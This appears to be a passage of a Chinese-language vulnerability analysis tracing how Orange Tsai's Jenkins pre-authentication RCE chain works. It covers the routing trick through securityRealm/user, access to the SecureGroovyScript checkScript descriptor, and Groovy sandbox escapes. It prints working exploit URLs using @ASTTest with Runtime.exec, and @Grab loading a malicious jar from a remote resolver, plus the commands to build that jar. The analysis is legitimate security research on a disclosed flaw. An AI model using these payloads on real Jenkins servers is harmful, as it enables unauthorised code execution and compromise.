在利用orange文章中给出的跳板url进行跟踪的过程中，我一直试图去理解为什么要这样的构造，而并不是直接拿来这个url进行动态调。下面我将尝试去解释如何一步步发现以及一步步的构造这个跳板。
在0x02中我们已经分析了可以利用三种白名单中的路由格式来绕过权限检查，这里我们利用`securityRealm`来构造利用链。
#### securityRealm中可用的利用链
我们看一下`securityRealm`对应的metaClass中有什么可以用的：
可以看到总共可用的有30个之多，而真正可以控制的利用链只有`hudson.security.HudsonPrivateSecurityRealm.getUser(String)`。
>
> 如果仔细阅读了文档，可以很容易根据方法名来理解这个方法主要是干什么的，比如get(...)[token]这样的，就说明他会根据路由解析策略来解析之后的参数，如果说是do(...)这样的，证明会执行相应的方法。
那么也就说我们之后的操作需要基于`getUser`这个方法。根据路由解析策略，我们现在构造这样的url来进一步动态看一下在`User`对应的metaClass中有什么可以利用的。
#### 突破习惯性思维
我们这此将url更改为：
    /securityRealm/user/admin
看一下metaClass中的内容，发现都是`User`这个类中的方法，好像没有什么能用的东西，好像这个思路不可行了，那么这个时候能不能继续利用路由的解析特点来调用其他的类中的方法呢？可以的。
这个时候就要说一下在每个节点加载时候存在的一个问题，这部分是我自己的猜测可能有错误，希望大家指正。
根据0x01中的分析，我们都知道第一个根节点为`hudson.model.Hudson`，而`Hudson`又是继承于`Jenkins`的，所以他会将hudson和jenkins包下的model中所有的类全部都加载进metaClass中，从动态调试中我们也能看得出来：
那么由于我们是需要利用`securityRealm`来绕过权限检测，那么这个时候下次处理的根节点为`hudson.security.HudsonPrivateSecurityRealm`，同样，这里也会加载`HudsonPrivateSecurityRealm`这个类下的所有方法，因为这里只有`getUser(String)`中的String是收我们控制并且能执行的一个方法，所以我们这里就可以调用到`hudson.model.User`类，此时路由解析会认为下一个节点是该方法的一个参数（token），在解析下一个节点时将其节点带入到`getUser()`方法中。在这里metaClass中是`User`这个类中的所有方法，但是在路由解析中认为下一个节点并不会是与`User`所相关的参数或方法。
**所以当我们在这里新传入一个不在metaClass中的方法时，他首先会在构建metaClass的过程中尝试找到这个未知的类及其继承树中的类，并将其加入到metaClass中。**
而这个添加的过程，就在`webApp.getMetaClass(node)`中：
所以我可以构造这么样一个url来调用`hudson.search.Search#doIndex`来进行查询：
    http://localhost:8080/jenkins_war_war/securityRealm/user/admin/search/index?q=a
同样我也可以尝试调用`hudson.model.Api#doJson`：
    http://localhost:8080/jenkins_war_war/securityRealm/user/admin/api/json
这么顺着想当然没有问题，但是我在分析的时候又有一个想法，如果说我不加`user/admin`也就是说不调用`User`能不能直接加载`api/json`来查看信息呢？
不行，为什么呢？同样的问题也出现在调用`search/index`中。
#### 理解metaClass的加载机制
这个问题其实是一个比较钻牛角尖的问题，以及对`metaClass`加载方式不完全了解的问题。我们来看一下`User`的继承树关系图:
`User`类是直接继承于`AbstractModelObject`这个抽象类的，而`AbstractModelObject`是`SearchableModelObject`这个接口的实现，这是一条完整的继承树关系。我们来首先看一下`SearchableModelObject`这个接口：
在接口这里声明了一个`getSearch()`方法，也就是说当节点为`User`类时，在metaClass寻找的过程中是可以通过继承树关系来找到`getSearch()`方法的，接下来看一下具体的实现:
这里会返回一个`Search`对象，然后这个对象中的所有方法都会被添加进入metaClass中，并通过`buildDispatchers()`来完成分派器的生成，然后就是正常的路由解析过程。
而在`HudsonPrivateSecurityRealm`的继承树关系中是没有这一层关系的：
所以`search/index`是没办法被找到的。
#### 思考
现在我们理清楚了未什么跳板url需要这样构造，说实话，调用到`User`这个类其实就是完成了一个作用域的调转，从原来的限制比较死的作用域跳转到一个更加广阔的作用域中了。
那么现在问题来了，rce的利用链到底在哪里？
我们重新看看在`User`节点中还有什么是可以利用的：
这里好像可以调用`ModelObject`中的东西，那么先来分析一下`DescriptorByNameOwner`这个接口：
可以看到就是通过id来获取相应的Descriptor，也就是说接下来去寻找可用的Descriptor就行了。这里下个断点就能看到582个可调用的Descriptor了。
### 0x05 Groovy沙盒绕过最终导致的rce
Jenkins 2019-01-08的安全通告中包含了Groovy沙箱绕过的问题：
其实最后可利用的点并非这么几条路，但是其原理都是差不多的，这里用Script Security这个插件作为例子来分析。
在`org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript#DescriptorImpl`中我们首先可以看到这个`DescriptorImpl`是继承于`Descriptor`的，也就是说我们上面的调用链可以访问到该方法；同时在这个方法中存在一个`doCheckScript`的方法，根据前面的分析，我们知道这个方法也是可以被我们利用的，并且这个方法的value是我们可控的，在这里完成的对value这个Groovy表达式的解析。
这里只是解析了Grovvy表达式，那么它是否执行了呢？这里我们先不讨论是否执行了，我们来试一试公告中的沙箱绕过方式是怎么做的。
#### 方法一：@ASTTest中执行assertions
首先在本地试一下`@ASTTest`中是否能执行断言，执行的断言是否能执行代码：
然后试一下这个poc：
    http://localhost:8080/jenkins_war_war/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a
    %40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(%22open+%2fApplications%2fCalculator.app%22)%7d)%0a
    class+Person%7b%7d
成功执行代码。
这里的执行命令的方式可以换成groovy形式的执行方法:
    http://localhost:8080/jenkins_war_war/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a
    %40ASTTest(value%3d%7b+%22open+%2fApplications%2fCalculator.app%22.execute().text+%7d)%0a
    class+Person%7b%7d
#### 方法二：@Grab引入外部的危险类
`Grape`是groovy内置的依赖管理引擎，具体的说明在[官方文档](http://docs.groovy-lang.org/latest/html/documentation/grape.html)中，可以仔细阅读。
在阅读`Grape`文档时，关于引入其他存储库这部分的操作是非常令人感兴趣的:
如果这里的root是可以指向我们控制的服务器，引入我们已经构造好的恶意的文件呢？有点像JNDI注入了吧。
本地写个demo试一下:
那么按照这个模式来构造，这里参考Orange第二篇文章或[这篇利用文章](https://0xdf.gitlab.io/2019/02/27/playing-with-jenkins-rce-vulnerability.html)，我的执行流程如下:
    javac Exp.java
    mkdir -p META-INF/services/
    echo Exp > META-INF/services/org.codehaus.groovy.plugins.Runners
    jar cvf poc-2.jar Exp.class META-INF
    mkdir -p ./demo_server/exp/poc/2/
    mv poc-2.jar demo_server/exp/poc/2/
然后构造如下的请求：
    http://localhost:8080/jenkins_war_war/securityRealm/user/test/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=@GrabConfig(disableChecksums=true)%0a
    @GrabResolver(name='Exp', root='http://127.0.0.1:9999/')%0a
    @Grab(group='demo_server.exp', module='poc', version='2')%0a
    import Exp;
### 0x06 总结
Orange这个洞真的是非常精彩，从动态路由入手，再到Pipeline这里groovy表达式解析，真的是一环扣一环，在这里我用正向跟进的方法将整个漏洞梳理了一遍，梳理前是非常迷惑的，梳理后恍然大悟，越品越觉得精彩。Orange
Tql。
T T
### 0x07 Reference
  * 
  * 
  * 
  * 
  * 
  * 
  * 
* * *